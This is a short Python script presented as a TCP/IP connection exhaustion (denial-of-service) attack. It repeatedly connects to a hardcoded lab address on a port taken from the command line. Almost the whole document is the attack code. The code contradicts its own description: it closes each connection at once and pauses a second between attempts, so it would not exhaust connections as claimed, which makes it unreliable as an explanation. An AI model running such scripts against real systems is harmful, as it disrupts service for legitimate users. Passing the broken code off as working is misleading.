'''TCP/IP Connection Exhaustion Attack: 
In this attack, the attacker consumes all available TCP/IP connections by opening multiple connections to a target system. 
This prevents legitimate users from establishing new connections.'''

//code
import sys
import time
import socket

target_ip = "10.0.2.15"
target_port = 8080  # Specify the target port as an integer

# Track the number of connections made
connection_count = 0

def create_connection(target_ip, target_port):
    global connection_count  # Access the connection_count variable

    try:
        # Create a socket and connect to the target IP and port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # Increment the connection count
        connection_count += 1

        # Close the connection
        s.close()
    except Exception as e:
        pass  # Handle exceptions gracefully

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python connection_exhaustion.py <target_port>")
        sys.exit(1)

    target_port = int(sys.argv[1])  # Parse the target port from the command line argument

    print("Connection exhaustion started, press Ctrl+C to stop...")

    try:
        while True:
            create_connection(target_ip, target_port)
            time.sleep(1)  # Delay for 1 second between creating connections
    except KeyboardInterrupt:
        print("\nConnection exhaustion stopped.")
        print(f"Total connections made to the target system: {connection_count}")
